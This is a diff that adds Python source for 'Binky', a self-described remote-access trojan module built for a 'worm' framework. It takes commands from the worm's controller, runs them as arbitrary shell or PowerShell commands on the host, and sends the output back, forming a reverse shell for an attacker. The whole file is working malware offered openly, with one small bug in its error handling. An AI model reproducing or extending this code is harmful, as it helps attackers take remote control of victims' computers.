@@ -1,0 +1,85 @@
+#!name##Binky
+#!types##module
+#!info##Simple RAT module. Include reverse CMD shell and Power Shell.
+#!subTypes##rat
+
+import subprocess
+import os
+
+
+class Binky:
+    MTYPES = "rat"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.power_shell = ""
+        self.find_power_shell()
+    
+    def shell_command(self, command: str) -> None:
+        try:
+            out = subprocess.run(command, capture_output=True, shell=True, text=True)
+        except:
+            return f"Error: {e}"
+        if out.returncode == 0:
+            return out.stdout
+        else:
+            return out.stderr
+    
+    def pwd(self) -> str:
+        return f"Actual Path: {os.getcwd()}\n"
+    
+    def change_dir(self, target: str) -> None:
+        try:
+            os.chdir(target)
+            self.worm.send_msg(f"Change dir successfull: {self.pwd()}")
+        except OSError as e:
+            self.worm.send_msg(f"ERROR change dir: {e}")
+    
+    def find_power_shell(self) -> None:
+        try:
+            winp = os.environ["WINDIR"]
+        except:
+            try:
+                winp = os.environ["SYSTEMROOT"]
+            except:
+                self.power_shell = "powershell"
+                return
+        winp = os.path.join(winp, "system32")
+        for r,d, file in os.walk(winp, topdown=False):
+            for f in file:
+                if f == "powershell.exe":
+                    self.power_shell = os.path.join(r, f)
+                    return
+    
+    def ps_command(self, command: str) -> None:
+        try:
+            out = subprocess.run(f"{self.power_shell} {command}", capture_output=True, shell=True, text=True)
+        except Exception as e:
+            return f"Error: {e}"
+        if out.returncode == 0:
+            return out.stdout
+        else:
+            return out.stderr
+
+
+    
+    def exec_cmd(self, cmd: dict) -> None:
+        match cmd["cmd"]:
+            case "cd":
+                self.change_dir(cmd["data"])
+            case "pwd":
+                self.worm.send_msg(self.pwd())
+            case "cmd":
+                self.worm.send_msg(self.shell_command(cmd.get("data")))
+            case "ps":
+                self.worm.send_msg(self.ps_command(cmd.get("data")))
+    
+    def help(self) -> str:
+        h = "\n-------- Binky Module Help --------\n"
+        h += f"{'cd [dir_name]':<25}Change directory\n"
+        h += f"{'pwd':<25}Show actual path\n"
+        h += f"{'cmd [command]':<25}Exec shell command\n"
+        h += f"{'ps [command]':<25}Run Power Shell command. Work only on windows\n"
+        return h
+    
+    def start(self) -> None:
+        pass
